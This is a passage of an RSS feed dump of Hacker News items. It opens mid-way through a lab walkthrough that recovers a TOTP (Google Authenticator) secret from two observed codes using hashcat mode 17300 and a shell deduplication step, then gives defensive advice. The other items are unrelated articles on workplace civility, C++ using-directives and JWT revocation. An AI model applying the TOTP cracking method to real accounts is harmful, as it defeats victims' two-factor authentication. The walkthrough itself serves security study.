<p>Let's now see if we can simulate an attack within a controlled keyspace. In order to keep our OpenCL kernels fast, the base32 encoding of our secret is only performed by the CPU once a candidate has been matched. This means that all of the candidates we try will be raw, but the output of a match will be base32 encoded.</p>

<p><strong>Don't try to attack the base32 value directly. This won't work!</strong></p>

<p>For this test, we will take our raw secret (<code>hashcat</code>) and base32 encode it to produce <code>NBQXG2DDMF2A====</code>. This represents our target secret which we hope to recover. In the wild, it would be sitting on some remote resource responsible for authentication, and unknown to us.</p>

<p>Next, we need two TOTP codes derived from this secret. It's a lot easier than it seems to obtain these codes. They do not need to be consecutive, we just need two of them. Something as simple as a photo (or video) of someone's TOTP client would be sufficient (a picture has the code which was produced, and the EXIF data should provide you with a timestamp.)</p>

<p>For this experiment, since this is just a test lab, we will use python's <code>pyotp</code> package to produce our two TOTP codes. We are going to use two random timestamps to generate these codes, using the <code>pyotp.TOTP.at()</code> method. (The timestamps can be any values, as long as they are different.)</p>

<pre><code>$ python
Python 2.7.10 (default, Aug 17 2018, 17:41:52)
[GCC 4.2.1 Compatible Apple LLVM 10.0.0 (clang-1000.0.42)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import pyotp
&gt;&gt;&gt; totp = pyotp.TOTP("NBQXG2DDMF2A====")
&gt;&gt;&gt; totp.at(1263384780)
u'833060'
&gt;&gt;&gt; totp.at(1528848780)
u'549115'
</code></pre>

<p>Now that we have our tokens and our timestamps, we need to place them in a file using the format <code>$TOKEN:$TIMESTAMP</code>. Let's call the file <code>test.hash</code> for this simulation.</p>

<pre><code>$ cat test.hash
833060:1263384780
549115:1528848780
</code></pre>

<p>The attack itself will be done in two parts:
* First, we run Hashcat against the test codes to produce all of the secret candidates in our keyspace. To keep this simulation manageable, we will only use the topology <code>?l?l?l?l?l?l?l</code>.
* Second, we will check our candidates for duplicates to find our genuine secret.</p>

<h3>The attack</h3>

<p>This particular hash mode is not like your average modes in Hashcat. By default its definition tells Hashcat to keep guessing candidates until the available keyspace is exhausted. As a result, Hashcat's "recovered" stat will always remain 0 despite your pot file filling up. This is expected, so don't worry!</p>

<p>Let's see an example in action...</p>

<pre><code>./hashcat -m17300 -a3 -o totp.potfile test.hash ?l?l?l?l?l?l?l
hashcat (v4.2.1-58-g1b980cf0+) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i7-6567U CPU @ 3.30GHz, skipped.
* Device #2: Intel(R) Iris(TM) Graphics 550, 384/1536 MB allocatable, 48MCU

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Brute-Force

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;

Session..........: hashcat
Status...........: Exhausted
Hash.Type........: TOTP (HMAC-SHA1)
Hash.Target......: test.hash
Time.Started.....: Wed Oct  3 21:37:27 2018 (1 hour, 23 mins)
Time.Estimated...: Wed Oct  3 23:01:15 2018 (0 secs)
Guess.Mask.......: ?l?l?l?l?l?l?l [7]
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  7218.0 kH/s (2.43ms) @ Accel:4 Loops:2 Thr:256 Vec:1
Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 16063620352/16063620352 (100.00%)
Rejected.........: 0/16063620352 (0.00%)
Restore.Point....: 456976/456976 (100.00%)
Restore.Sub.#2...: Salt:1 Amplifier:17574-17576 Iteration:0-2
Candidates.#2....: uqxtuaq -&gt; xqxqxqg
</code></pre>

<h3>Post-hashcat cleanup</h3>

<p>Once the attack is finished, you should have a pool of candidates in your pot file. Most of them should be unique, but your genuine secret will be duplicated across two entries. We just need a tiny bit of shell work to reveal which one that was. The following snippet should do this for you.</p>

<pre><code>$ cut -d: -f3 totp.potfile | sort | uniq -c | sort -nr | head
  2 NBQXG2DDMF2A====
  1 PJZXS23RPFYA====
  1 PJZXO5TDNZTA====
  1 PJZXM5DMOBTQ====
  1 PJZXM2LTMV2A====
  1 PJZXI5DWNZWA====
  1 PJZXG2DUNZTQ====
  1 PJZXA4LQOBUQ====
  1 PJZXA4LPN55A====
  1 PJZWYYTBONYA====
</code></pre>

<p>Huzzah! Our duplicated secret appears on top!</p>

<blockquote>
  <p><em>NOTE:</em> If you see more than one entry with a count higher than 1, something went wrong. You should re-evaluate your steps.</p>
</blockquote>

<p>Now, we can take this secret and plug it back into pyotp (or your client of choice) to generate valid tokens!</p>

<h2>Practical exploitation</h2>

<p>In the wild, this is a bit more nuanced. We aren't usually going to know much about the target secret (like its topology), so we may need to search through a larger keyspace. This could take quite some time. Of course, the more GPUs you have, the faster this will go.</p>

<p>This also assumes that your TOTP implementation is using a few defaults: 30 second steps, HMAC-SHA1 hashing, and 10-byte secrets. You may be surprised at how many implementations use the defaults, or worse yet make the defaults immutable (I'm looking at you Google Authenticator!)</p>

<p>For clarity, the RFC technically defines a secret length at 16 bytes minimum, but many implementations are calculating this from the base32 encoded secret. This means, our 16 byte secret is really a 10 byte secret when decoded. Again, it doesn't <em>have</em> to be this way. But even if the secret is 10 bytes, this attack may not be practical for most (though it isn't out of the realm of possibilities for some actors.) A truly random 10 byte keyspace is incredibly large (although "true randomness" deserves its own discussion.) Any insight you can gain to help reduce the keyspace is definitely going to help here.</p>

<p>If you are responsible for maintaining a TOTP system, I would recommend setting a stronger algorithm (use HMAC-SHA512 if possible) and longer secrets (24+ bytes should last a while into the future.)</p>

<p>Never take your world for granted. Test everything. Hack the planet.</p>
</div></div>]]>
            </description>
            <link>https://unix-ninja.com/p/attacking_google_authenticator</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523177</guid>
            <pubDate>Wed, 23 Dec 2020 22:47:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Managing with Kindness, Civility and Respect]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25522981">thread link</a>) | @DanBC
<br/>
December 23, 2020 | https://people.nhs.uk/guides/managing-with-kindness-civility-and-respect/ | <a href="https://web.archive.org/web/*/https://people.nhs.uk/guides/managing-with-kindness-civility-and-respect/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div id="ld-tab-content-2716">
<section></section>
<blockquote><p>Civility saves lives!</p><cite>Dr Chris Turner</cite></blockquote>
<p>Stress can negatively impact on the way we act towards each other. This can include people losing their tempers, being rude and saying or doing things they would not normally say or do.</p>
<p>In these extraordinary times, causes of work-related stress can be worse with the pressures of Covid-19. Many people are scared, frightened and stressed – for our patients, our colleagues and for ourselves and our families.</p>
<p>Being scared and anxious are natural responses to stress. The challenge is how we deal with them.</p>
<p>When operating under unusual and challenging circumstances, your management skills are more important than ever. All of these skills are useful in your everyday management role – and not just during the Covid-19 event. </p>
<details><summary role="button"><span>This guide was developed in partnership with Duncan Lewis</span></summary><p>Duncan is formerly Professor of Management at the Plymouth University Business School in the UK and is Adjunct Professor at Edith Cowan University in Perth, Western Australia. Duncan is experienced in policy and practice work associated with workplace bullying and is a founding member of the International Association on Workplace Bullying and Harassment (IAWBH).</p></details>
</div>
</div> 
</div></div>]]>
            </description>
            <link>https://people.nhs.uk/guides/managing-with-kindness-civility-and-respect/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25522981</guid>
            <pubDate>Wed, 23 Dec 2020 22:24:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How do C++ using-directives work?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25522918">thread link</a>) | @ingve
<br/>
December 23, 2020 | https://quuxplusone.github.io/blog/2020/12/21/using-directive/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2020/12/21/using-directive/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Recall that in C++ there’s a difference between a <em>using-declaration</em>
and a <em>using-directive</em>.</p>

<div><div><pre><code>using std::string;  // using-declaration
using namespace std;  // using-directive
</code></pre></div></div>

<h2 id="using-declarations">Using-declarations</h2>

<p>A using-declaration is semantically similar to a declaration;
it introduces into the current scope a new meaning for a name. If that
name already had one or more meanings from outer scopes, those existing
meanings are <em>hidden</em>, or <em>shadowed</em>, by the new declaration.
<a href="https://godbolt.org/z/Khx1cb">Godbolt:</a></p>

<div><div><pre><code>namespace AnimalUtils {
    int foo(Zoo::Animal);
}
namespace Outer {
    int foo(Zoo::Lion);
    namespace Inner {
        int foo(Zoo::Cat);  // declaration hides Outer::foo
        int test1() {
            return foo(Zoo::Lion());
        }
        int test2() {
            using AnimalUtils::foo;  // using-declaration hides Inner::foo
            return foo(Zoo::Lion()); // calls AnimalUtils::foo
        }
    }
}
</code></pre></div></div>

<p>The declaration of <code>foo</code> in <code>Inner</code> <em>hides</em>, or <em>shadows</em>, the previous meaning that <code>foo</code> had had;
so when we look up the name <code>foo</code> inside <code>test1</code>, we find only <code>Inner::foo</code>.
We don’t even consider <code>Outer::foo</code> as a candidate.</p>

<p>The using-declaration of <code>foo</code> in <code>test2</code> <em>hides</em>, or <em>shadows</em>, the previous meaning that <code>foo</code>
had had; so when we look up the name <code>foo</code> inside <code>test2</code>, we find only <code>AnimalUtils::foo</code>.
We don’t even consider <code>Inner::foo</code> as a candidate.</p>

<p>(So how does <a href="https://quuxplusone.github.io/blog/2020/07/11/the-std-swap-two-step/">the <code>std::swap</code> two-step</a> work?
Well, besides the normal unqualified lookup, we also do a <em>separate</em> argument-dependent lookup,
and merge the two candidate sets. So in this particular case, overload resolution would also
consider any meanings of <code>foo</code> declared in namespace <code>Zoo</code>. But there is no such <code>foo</code> in
this example.)</p>

<h2 id="using-directives">Using-directives</h2>

<p>Using-directives are subtler than using-declarations. But the good news is that
<a href="https://stackoverflow.com/questions/1452721/why-is-using-namespace-std-considered-bad-practice">you should never use them!</a>
Seriously, don’t ever write <code>using namespace Whatever</code>; and then you won’t have
any trouble with them. Just pretend they don’t exist.</p>

<p><b>But</b>, let’s talk about them anyway.</p>

<p>Using-directives also introduce new meanings for names into scopes. But the surprising
thing is that they don’t introduce those meanings into the <em>current</em> scope! A using-directive
introduces its new meanings into the scope which is the
<a href="https://en.wikipedia.org/wiki/Lowest_common_ancestor">lowest common ancestor</a>
of the current scope and the target namespace’s own scope.</p>

<p>In a directed acyclic graph (DAG), the “lowest common ancestor” of two nodes <em>A</em> and <em>B</em>
can be found by tracing a path from <em>A</em> up to the root, and tracing a path from <em>B</em> up to
the root — the lowest common ancestor is the place where the two paths first meet up.</p>

<p>Alternatively, start tracing a “fully qualified path” downward from the root; the
lowest common ancestor corresponds to the longest common prefix of these fully qualified
names. For example, consider this hierarchy of namespaces:</p>

<div><div><pre><code>namespace NA { }
namespace NB {
    namespace NC {
        namespace N1 { }
        namespace N2 { }
    }
}
</code></pre></div></div>

<p>The lowest common ancestor of <code>NB::NC::N1</code> and <code>NB::NC::N2</code> is <code>NB::NC</code>.
The lowest common ancestor of <code>NA</code> and <code>NB::NC::N2</code> is the root (the global namespace).</p>

<p>So, consider this snippet of C++ code (<a href="https://godbolt.org/z/h41d9T">Godbolt</a>):</p>

<div><div><pre><code>namespace NA {
    int foo(Zoo::Lion);
}
namespace NB {
    int foo(Zoo::Lion);
    namespace NC {
        namespace N1 {
            int foo(Zoo::Cat);
        }
        namespace N2 {
            int test() {
                using namespace N1;
                using namespace NA;
                return foo(Zoo::Lion());
            }
        }
    }
}
</code></pre></div></div>

<p>You might reasonably expect that when <code>test</code> passes a <code>Lion</code> to <code>foo</code>,
it would result in a call to <code>NA::foo(Lion)</code>, because we “using-directive’d”
<code>namespace NA</code>. Or at least it might call <code>NB::foo(Lion)</code>, since that’s
what would happen in the absence of any using-directives at all.
But in fact it calls <code>N1::foo(Cat)</code>!</p>

<p>As shown in the diagram below: <code>using namespace N1</code> causes a declaration of
<code>N1::foo(Cat)</code> to be injected into the least common ancestor of <code>N1</code> and <code>N2</code>,
which is <code>NC</code>. This declaration of the name <code>foo</code> <em>hides</em> any and all meanings
of <code>foo</code> introduced in higher-up scopes, such as <code>NB::foo(Lion)</code>.</p>

<p><code>using namespace NA</code> causes a declaration of <code>NA::foo(Lion)</code> to be injected
into the least common ancestor of <code>NA</code> and <code>N2</code>, which is the global namespace.
This injected declaration ends up being hidden by the declaration of <code>NB::foo(Lion)</code>,
which is in turn hidden by the declaration of <code>N1::foo(Cat)</code> which has been
injected into namespace <code>NC</code>.</p>

<p><img src="https://quuxplusone.github.io/blog/images/2020-12-21-using-directive.png" alt="Diagram of what happens in that example"></p>

<p>By the way, even though the declaration of <code>N1::foo</code> has been injected into <code>NC</code>,
you can’t actually refer to it as <code>NC::foo</code>. It has been injected only for the purposes
of <em>unqualified</em> lookups — and only for the purposes of unqualified lookups that happen
within this scope. Nobody outside of the scope of <code>test</code> is going to “see” that
declaration of <code>foo</code> injected into namespace <code>NC</code>.</p>

<h3 id="a-stdswap-mis-step">A <code>std::swap</code> mis-step</h3>

<p>Consider the following bad code (<a href="https://godbolt.org/z/6aPT71">Godbolt</a>):</p>

<div><div><pre><code>namespace detail {
    struct Impl {};
    void swap(Impl&amp;, Impl&amp;);

    template&lt;class T&gt;
    void example(T&amp; x, T&amp; y) {
        using namespace std;
        swap(x, y);
    }
}
</code></pre></div></div>

<p>It’s bad for three reasons. Number one, it fails to use the hidden friend idiom
for <code>swap(Impl&amp;, Impl&amp;)</code>. Number two, it uses <code>using namespace std</code>. (Both of these are
red flags that should insta-fail any code review you do.)
Number three, its use of <code>using namespace</code> is wrong in terms of the “<code>std::swap</code> two-step.”
(See <a href="https://quuxplusone.github.io/blog/2020/07/11/the-std-swap-two-step/">“What is the <code>std::swap</code> two-step?”</a> (2020-07-11).)
In the two-step, we <em>want</em> to bring the meaning of <code>swap</code> from namespace <code>std</code> into our current scope,
so that <code>swap(x, y)</code> will consider that meaning in addition to any meaning assigned
by ADL. But what we’re doing here, instead, is to bring the meaning of <code>swap</code> (and every
other name in <code>std</code>) from namespace <code>std</code> into <em>the least common ancestor namespace</em> of
<code>std</code> and <code>detail</code>; i.e., into the global namespace.</p>

<p>So when we try to instantiate <code>example&lt;int&gt;</code>, unqualified lookup looks for declarations of
<code>swap</code> in our current scope working outward, and it finds <code>detail::swap(Impl&amp;, Impl&amp;)</code> and stops
there. It never finds the templated <code>std::swap</code> declared in the global namespace. Oops!
That’s why the <em>correct</em> version of the <code>std::swap</code> two-step uses a using-declaration and
not a using-directive.</p>

<h2 id="using-directives-in-namespace-scope">Using-directives in namespace scope</h2>

<p>You can also put a <em>using-directive</em> at namespace scope, like this
(<a href="https://godbolt.org/z/9EdMMo">Godbolt</a>):</p>

<div><div><pre><code>namespace ND::N3 {
    int foo(Zoo::Cat);
}

namespace NE {
    using namespace ND::N3;
    int foo(Zoo::Lion);
}

namespace ND {
    namespace N4 {
        int test3() {
            using namespace NE;
            return foo(Zoo::Lion());
        }
    }
}
</code></pre></div></div>

<p>Using-directives are “transitive”; since <code>NE</code> visibly contains a using-directive
for <code>ND</code>, it’s as if <code>test3</code> contains <em>both</em> <code>using namespace NE</code> <em>and</em> <code>using namespace ND::N3</code>.</p>

<p>In this contrived example, the names from <code>NE</code> are injected into the least common ancestor
of <code>ND::N4</code> and <code>NE</code> (i.e., the global namespace). The names from <code>ND::N3</code> are injected into the
least common ancestor of <code>ND::N4</code> and <code>ND::N3</code> (i.e., <code>ND</code>). Then, unqualified
lookup for <code>foo</code> scans outward from <code>ND::N4::test3</code>, stopping as soon as it finds the declaration of
<code>ND::N3::foo(Cat)</code> that has been injected into namespace <code>ND</code>. That declaration <em>hides</em>
the ostensibly better-matching <code>NE::foo(Lion)</code> that was injected into the global namespace.</p>

<p>Note that the “transitivity” of using-directives applies only to using-directives that are <em>directly</em>
within the using’ed namespace. If <code>test3</code> had said <code>using namespace NE::N5</code>, it would have
transitively picked up the using-directives from <code>NE::N5</code>, but not from its parent namespace <code>NE</code>
(and not from the global namespace).</p>

<p>And how does all this interact with <a href="https://en.cppreference.com/w/cpp/language/namespace#Inline_namespaces"><code>inline namespace</code></a>?
Well, let’s save that for another day.</p>

<hr>

<p>Some of these examples probably surprised you. I hope the explanations made sense anyway, in retrospect.
But is any of this information <em>useful</em> to a good C++ programmer? I would have to say <b>no it is not.</b>
Good C++ programmers don’t use using-directives — and I hope this blog post has convinced you
to join them!</p>

<blockquote>
  <p>Don’t use <code>using namespace</code>.</p>
</blockquote>

<p>As for <em>why</em> using-directives work in this bizarrely unintuitive way, I’ve asked that
question <a href="https://stackoverflow.com/questions/65365681/why-does-cs-using-namespace-work-the-way-it-does">over on Stack Overflow</a>.
So if you’ve got a good answer, that’s a great place to type it up!</p>

  </div></div>]]>
            </description>
            <link>https://quuxplusone.github.io/blog/2020/12/21/using-directive/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25522918</guid>
            <pubDate>Wed, 23 Dec 2020 22:18:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Security on Mobile Devices [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25522647">thread link</a>) | @uselpa
<br/>
December 23, 2020 | https://securephones.io/main.pdf | <a href="https://web.archive.org/web/*/https://securephones.io/main.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://securephones.io/main.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25522647</guid>
            <pubDate>Wed, 23 Dec 2020 21:51:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Revoking JWTs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25522635">thread link</a>) | @mooreds
<br/>
December 23, 2020 | https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>I have been talking with developers about JSON Web Tokens (JWTs) recently and one question keeps coming up: “How do I revoke a JWT?”</p>

<p>If you poke around online, you’ll find that the most common answers are:</p>

<ul>
  <li>Set the duration of the JWT to a short period (a few minutes or seconds)</li>
  <li>Implement complicated blacklisting techniques</li>
  <li>Store every JWT so you can validate them</li>
</ul>

<p>There is not a simple solution because JWTs are designed to be portable, decoupled identities. Once you authenticate against an identity provider (IdP) and get back a JWT, you don’t need to ask the IdP if the JWT is valid. This is particularly powerful when you use RSA public/private key signing. The IdP signs the JWT using the private key and then any service that has the public key can verify the integrity of the JWT.</p>

<p>Here’s a diagram that illustrates this architecture:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/jwt-revoke_350.png" alt="Revoking JWTs"></p>

<p>The Todo Backend in the diagram can use the JWT and the public key to verify the JWT and then pull the user’s id (in this case the subject) out of the JWT. The Todo Backend can then use the user’s id to perform operations on that user’s data. However, because the Todo Backend isn’t verifying the JWT with the IdP, it has no idea if an administrator has logged into the IdP and locked or deleted that user’s account.</p>

<h2 id="reduce-the-duration-of-the-jwt">Reduce the duration of the JWT</h2>

<p>The most common solution is to reduce the duration of the JWT and revoke the refresh token so that the user can’t generate a new JWT. With this setup, the JWT’s expiration duration is set to something short (5-10 minutes) and the refresh token is set to something long (2 weeks or 2 months). At any time, an administrator can revoke the refresh token which means that the user must re-authenticate to get a new JWT. That is unless they happen to have a valid JWT.</p>

<p>Here’s where things get tricky. That user basically has 5 to 10 minutes to use the JWT before it expires. Once it expires, they’ll use their current refresh token to try and get a new JWT. Since the refresh token has been revoked, this operation will fail and they’ll be forced to login again.</p>

<p>It’s this 5 to 10 minute window that freaks everyone out. So, how do we fix it?</p>

<h2 id="webhooks">Webhooks</h2>

<p>One way is leveraging a distributed event system that notifies services when refresh tokens have been revoked. The IdP broadcasts an event when a refresh token is revoked and other backends/services listen for the event. When an event is received the backends/services update a local cache that maintains a set of users whose refresh tokens have been revoked. This cache is checked whenever a JWT is verified to determine if the JWT should be revoked or not. This is all based on the duration of JWTs and expiration instant of individual JWTs.</p>

<h3 id="example-revoking-jwts-in-fusionauth">Example: Revoking JWTs in FusionAuth</h3>

<p>To illustrate this, I’m going to use <a href="https://fusionauth.io/">FusionAuth</a>’s event and Webhook system as well as the <em>jwt.refresh-token.revoke</em> event. If you are building your own IdP or using another system, you might need to build out your own eventing system based on this article.</p>

<p>The FusionAuth <strong>jwt.refresh-token.revoke</strong> event looks like this:</p>

<div><div><pre><code><span>{</span><span>
  </span><span>"event"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"type"</span><span>:</span><span> </span><span>"jwt.refresh-token.revoke"</span><span>,</span><span>
    </span><span>"applicationTimeToLiveInSeconds"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"cc0567da-68a1-45f3-b15b-5a6228bb7146"</span><span>:</span><span> </span><span>600</span><span>
    </span><span>},</span><span>
    </span><span>"userId"</span><span>:</span><span> </span><span>"00000000-0000-0000-0000-000000000001"</span><span>
  </span><span>}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>Next, let’s write a simple Webhook in our application that will receive this event and update the JWTManager. (NOTE: our example has a variable called <code>applicationId</code> that is a global variable that stores the id of the application itself - in this case it would be&nbsp;<strong>cc0567da-68a1-45f3-b15b-5a6228bb7146</strong>). Our code below is written in Node.js and uses the <a href="https://github.com/FusionAuth/fusionauth-node-client">FusionAuth Node client library</a>.</p>

<div><div><pre><code><span>/* Handle FusionAuth event. */</span>
<span>router</span><span>.</span><span>post</span><span>(</span><span>'</span><span>/fusionauth-webhook</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>JWTManager</span><span>.</span><span>revoke</span><span>(</span><span>req</span><span>.</span><span>body</span><span>.</span><span>event</span><span>.</span><span>userId</span><span>,</span> <span>req</span><span>.</span><span>body</span><span>.</span><span>event</span><span>.</span><span>applicationTimeToLiveInSeconds</span><span>[</span><span>applicationId</span><span>]);</span>
  <span>res</span><span>.</span><span>sendStatus</span><span>(</span><span>200</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>Here is how the JWTManager maintains the list of user ids whose JWTs should be revoked. Our implementation also starts a thread to clean up after itself so we don’t run out of memory.</p>

<div><div><pre><code><span>const</span> <span>JWTManager</span> <span>=</span> <span>{</span>
  <span>revokedJWTs</span><span>:</span> <span>{},</span>

  <span>/**
   * Checks if a JWT is valid. This assumes that the JWT contains a property named &lt;code&gt;exp&lt;/code&gt; that is a
   * NumericDate value defined in the JWT specification and a property named &lt;code&gt;sub&lt;/code&gt; that is the user id the
   * JWT belongs to.
   *
   * @param {object} jwt The JWT object.
   * @returns {boolean} True if the JWT is valid, false if it isn't.
   */</span>
  <span>isValid</span><span>:</span> <span>function</span><span>(</span><span>jwt</span><span>)</span> <span>{</span>
    <span>const</span> <span>expiration</span> <span>=</span> <span>JWTManager</span><span>.</span><span>revokedJWTs</span><span>[</span><span>jwt</span><span>.</span><span>sub</span><span>];</span>
    <span>return</span> <span>expiration</span> <span>===</span> <span>undefined</span> <span>||</span> <span>expiration</span> <span>===</span> <span>null</span> <span>||</span> <span>expiration</span> <span>&lt;</span> <span>jwt</span><span>.</span><span>exp</span> <span>*</span> <span>1000</span><span>;</span>
  <span>},</span>

  <span>/**
   * Revokes all JWTs for the user with the given id using the duration (in seconds).
   *
   * @param {string} userId The user id (usually a UUID as a string).
   * @param {Number} durationSeconds The duration of all JWTs in seconds.
   */</span>
  <span>revoke</span><span>:</span> <span>function</span><span>(</span><span>userId</span><span>,</span> <span>durationSeconds</span><span>)</span> <span>{</span>
    <span>JWTManager</span><span>.</span><span>revokedJWTs</span><span>[</span><span>userId</span><span>]</span> <span>=</span> <span>Date</span><span>.</span><span>now</span><span>()</span> <span>+</span> <span>(</span><span>durationSeconds</span> <span>*</span> <span>1000</span><span>);</span>
  <span>},</span>

  <span>/**
   * Cleans up the cache to remove old user's that have expired.
   * @private
   */</span>
  <span>_cleanUp</span><span>:</span> <span>function</span><span>()</span> <span>{</span>
    <span>const</span> <span>now</span> <span>=</span> <span>Date</span><span>.</span><span>now</span><span>();</span>
    <span>Object</span><span>.</span><span>keys</span><span>(</span><span>JWTManager</span><span>.</span><span>revokedJWTs</span><span>).</span><span>forEach</span><span>((</span><span>item</span><span>,</span> <span>index</span><span>,</span> <span>_array</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>const</span> <span>expiration</span> <span>=</span> <span>JWTManager</span><span>.</span><span>revokedJWTs</span><span>[</span><span>item</span><span>];</span>
      <span>if</span> <span>(</span><span>expiration</span> <span>&lt;</span> <span>now</span><span>)</span> <span>{</span>
        <span>delete</span> <span>JWTManager</span><span>.</span><span>revokedJWTs</span><span>[</span><span>item</span><span>];</span>
      <span>}</span>
    <span>});</span>
  <span>}</span>
<span>};</span>

<span>/**
 * Set an interval to clean-up the cache.
 */</span>
<span>setInterval</span><span>(</span><span>JWTManager</span><span>.</span><span>_cleanUp</span><span>,</span> <span>7000</span><span>);</span>
</code></pre></div></div>

<p>Our backend also needs to ensure that it checks JWTs with the JWTManager on each API call.</p>

<div><div><pre><code><span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/todo</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>jwt</span> <span>=</span> <span>_parseJWT</span><span>(</span><span>req</span><span>);</span>
  <span>if</span> <span>(</span><span>!</span><span>JWTManager</span><span>.</span><span>isValid</span><span>(</span><span>jwt</span><span>))</span> <span>{</span>
    <span>res</span><span>.</span><span>sendStatus</span><span>(</span><span>401</span><span>);</span>
    <span>return</span><span>;</span>
  <span>}</span>

  <span>// ...</span>
<span>});</span>
</code></pre></div></div>
<p>And finally we configure our Webhook in FusionAuth:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/webhooks-2019.jpg" alt="Set up a webhook in FusionAuth"></p>

<p>We can now revoke a user’s refresh token and FusionAuth will broadcast the event to our Webhook. The Webhook then updates the JWTManager which will cause JWTs for that user to be revoked.</p>

<p>This solution works well even in large systems with numerous backends. It requires the use of&nbsp;refresh tokens and an API that allows refresh tokens to be revoked. The only caveat is to be sure that your JWTManager code cleans up after itself to avoid&nbsp;running out memory.</p>

<p>If you are using FusionAuth, you can use the Webhook and Event system to build this feature into your application quickly. We are also writing JWTManager implementations into each of our client libraries so you don’t have to write those yourself. At the time of this writing, the Java and Node clients both have a JWTManager you can use. The other languages might have a JWTManager implementation now but if they don’t, just submit a support ticket or a Github issue and we will write one for you.</p>

<div>
  <h2>FusionAuth has you covered</h2>
  <p>
    
      If you are looking for a solution that provides support for events and Webhooks that can be used to implement this revocation strategy, FusionAuth has you covered.
    

    FusionAuth is a flexible and secure Customer Identity and Access Management solution. FusionAuth provides registration, login, passwordless login, SSO, MFA, data search, social login, user management and much more. Best of all, you can download and try it today for free.
  </p>
  <p>
    <a href="https://fusionauth.io/pricing">GET STARTED FOR FREE</a>
  </p>
</div>

            
          </div><div>
            <div>
              <p>
                Was this article awesome? Click a star to rate it.
              </p>
              
            </div>
          </div></div>]]>
            </description>
            <link>https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25522635</guid>
            <pubDate>Wed, 23 Dec 2020 21:49:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Evolution of Religion (2010) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25522433">thread link</a>) | @Hooke
<br/>
December 23, 2020 | https://www2.psych.ubc.ca/~henrich/pdfs/BIOT_a_00018.pdf | <a href="https://web.archive.org/web/*/https://www2.psych.ubc.ca/~henrich/pdfs/BIOT_a_00018.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www2.psych.ubc.ca/~henrich/pdfs/BIOT_a_00018.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25522433</guid>
            <pubDate>Wed, 23 Dec 2020 21:29:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using VR to improve apathy in residential aged care]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25522274">thread link</a>) | @finphil
<br/>
December 23, 2020 | https://nuadox.com/post/638328641529479168/vr-improving-apathy-in-aged-care | <a href="https://web.archive.org/web/*/https://nuadox.com/post/638328641529479168/vr-improving-apathy-in-aged-care">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="638328641529479168">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/638328641529479168/vr-improving-apathy-in-aged-care"><h2>Using VR to improve apathy in residential aged care</h2></a>
